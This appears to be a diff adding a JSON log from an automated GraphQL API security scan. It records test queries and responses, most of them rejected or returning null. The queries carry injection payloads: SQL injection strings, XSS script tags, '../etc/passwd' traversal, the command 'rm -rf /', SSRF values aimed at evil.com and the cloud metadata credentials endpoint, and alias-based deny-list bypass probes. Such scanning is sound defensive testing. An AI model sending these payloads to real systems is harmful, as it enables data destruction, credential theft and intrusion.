+    "request_time_seconds": 0.975,
+    "timestamp": "2025-10-05T20:48:16.706790Z",
+    "count": 89,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"../../../etc/passwd\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.191,
+    "timestamp": "2025-10-05T20:48:21.018513Z",
+    "count": 90,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"<h1>Hello, World!</h1>\") {\n    id\n    description\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.465,
+    "timestamp": "2025-10-05T20:48:23.861996Z",
+    "count": 91,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link_bypass_test_1\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.485,
+        "timestamp": "2025-10-05T20:48:26.086135Z",
+        "response_body": {
+          "data": {
+            "Link": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.099,
+        "timestamp": "2025-10-05T20:48:27.185350Z",
+        "response_body": {
+          "data": {
+            "bypassLink": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 92,
+    "timestamp": "2025-10-05T20:48:27.185436Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.772,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  bypassLink: Link(id: \"link_bypass_test_1\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.469,
+        "timestamp": "2025-10-05T20:48:30.107004Z",
+        "response_body": {
+          "data": {
+            "Link": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.903,
+        "timestamp": "2025-10-05T20:48:31.010044Z",
+        "response_body": {
+          "data": {
+            "bypassLink": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 93,
+    "timestamp": "2025-10-05T20:48:31.010205Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 2.096,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.534,
+    "timestamp": "2025-10-05T20:48:35.771209Z",
+    "count": 94,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Link]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/types]) : Field 'types' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link_suggestion_test\") {\n    idd\n    typ\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.534,
+    "timestamp": "2025-10-05T20:48:38.996538Z",
+    "count": 95,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/idd]) : Field 'idd' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/typ]) : Field 'typ' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-12345\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.732,
+    "timestamp": "2025-10-05T20:48:44.826100Z",
+    "count": 96,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-12345' OR '1'='1\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.762,
+    "timestamp": "2025-10-05T20:48:47.165648Z",
+    "count": 97,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-12345<script>alert('XSS')</script>\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.627,
+    "timestamp": "2025-10-05T20:48:50.293423Z",
+    "count": 98,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-12345; URL=http://evil.com/data\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.177,
+    "timestamp": "2025-10-05T20:48:53.373536Z",
+    "count": 99,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-12345; rm -rf /\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.498,
+    "timestamp": "2025-10-05T20:48:55.801458Z",
+    "count": 100,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-12345/../../etc/passwd\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.343,
+    "timestamp": "2025-10-05T20:48:58.707433Z",
+    "count": 101,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-12345<h1>Hello!</h1>\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.179,
+    "timestamp": "2025-10-05T20:49:02.465895Z",
+    "count": 102,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery BypassLink {\n  bypassedLink: Link(id: \"link-12345\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.567,
+        "timestamp": "2025-10-05T20:49:05.780267Z",
+        "response_body": {
+          "data": {
+            "Link": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.023,
+        "timestamp": "2025-10-05T20:49:06.803202Z",
+        "response_body": {
+          "data": {
+            "bypassedLink": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 103,
+    "timestamp": "2025-10-05T20:49:06.803304Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.53,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 2.245,
+    "timestamp": "2025-10-05T20:49:12.440174Z",
+    "count": 104,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Link]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/types]) : Field 'types' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"link-12345\") {\n    id\n    typ # Intentionally misspelling 'type' for suggestion testing\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.962,
+    "timestamp": "2025-10-05T20:49:16.270837Z",
+    "count": 105,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/typ]) : Field 'typ' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"28539296-c897-11e4-840b-132830f5faa0\") {\n    id\n    type\n    description\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.462,
+    "timestamp": "2025-10-05T21:18:53.300109Z",
+    "count": 106,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Link": {
+          "id": "28539296-c897-11e4-840b-132830f5faa0",
+          "type": "Link",
+          "description": ""
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"28539296-c897-11e4-840b-132830f5faa0' OR 1=1 -- \") {\n    id\n    description\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.907,
+    "timestamp": "2025-10-05T21:18:56.698682Z",
+    "count": 107,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Link": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"28539296-c897-11e4-840b-132830f5faa0\", description: \"<script>alert('XSS')</script>\") {\n    id\n    description\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.978,
+    "timestamp": "2025-10-05T21:19:00.154094Z",
+    "count": 108,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Link]) : Unknown field argument 'description'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 52
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"28539296-c897-11e4-840b-132830f5faa0\", url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/!\") {\n    id\n    url\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.515,
+    "timestamp": "2025-10-05T21:19:02.186165Z",
+    "count": 109,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Link]) : Unknown field argument 'url'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 52
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/url]) : Field 'url' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"28539296-c897-11e4-840b-132830f5faa0\", filename: \"; ls -la;\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.439,
+    "timestamp": "2025-10-05T21:19:05.023731Z",
+    "count": 110,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Link]) : Unknown field argument 'filename'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 52
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"28539296-c897-11e4-840b-132830f5faa0\", file: \"../../etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.481,
+    "timestamp": "2025-10-05T21:19:07.677567Z",
+    "count": 111,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Link]) : Unknown field argument 'file'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 52
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"28539296-c897-11e4-840b-132830f5faa0\", description: \"<h1>Hello World!</h1>\") {\n    id\n    description\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.093,
+    "timestamp": "2025-10-05T21:19:10.869767Z",
+    "count": 112,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Link]) : Unknown field argument 'description'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 52
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"28539296-c897-11e4-840b-132830f5faa0\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.913,
+        "timestamp": "2025-10-05T21:19:13.960902Z",
+        "response_body": {
+          "data": {
+            "Link": {
+              "id": "28539296-c897-11e4-840b-132830f5faa0",
+              "type": "Link"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.482,
+        "timestamp": "2025-10-05T21:19:14.442951Z",
+        "response_body": {
+          "data": {
+            "myLink": {
+              "id": "28539296-c897-11e4-840b-132830f5faa0",
+              "type": "Link"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 113,
+    "timestamp": "2025-10-05T21:19:14.443022Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.707,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery bypassQuery {\n  myLink: Link(id: \"28539296-c897-11e4-840b-132830f5faa0\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.485,
+        "timestamp": "2025-10-05T21:19:17.519187Z",
+        "response_body": {
+          "data": {
+            "Link": {
+              "id": "28539296-c897-11e4-840b-132830f5faa0",
+              "type": "Link"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.888,
+        "timestamp": "2025-10-05T21:19:18.407170Z",
+        "response_body": {
+          "data": {
+            "myLink": {
+              "id": "28539296-c897-11e4-840b-132830f5faa0",
+              "type": "Link"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 114,
+    "timestamp": "2025-10-05T21:19:18.407203Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.489,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.468,
+    "timestamp": "2025-10-05T21:19:21.863639Z",
+    "count": 115,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Link]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/types]) : Field 'types' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Link(id: \"28539296-c897-11e4-840b-132830f5faa0\") {\n    id\n    typ # Typ is a typo of 'type' for suggestion testing\n    descriotion # Typo of description\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.45,
+    "timestamp": "2025-10-05T21:19:24.230786Z",
+    "count": 116,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Link/typ]) : Field 'typ' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Link/descriotion]) : Field 'descriotion' in type 'Link' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
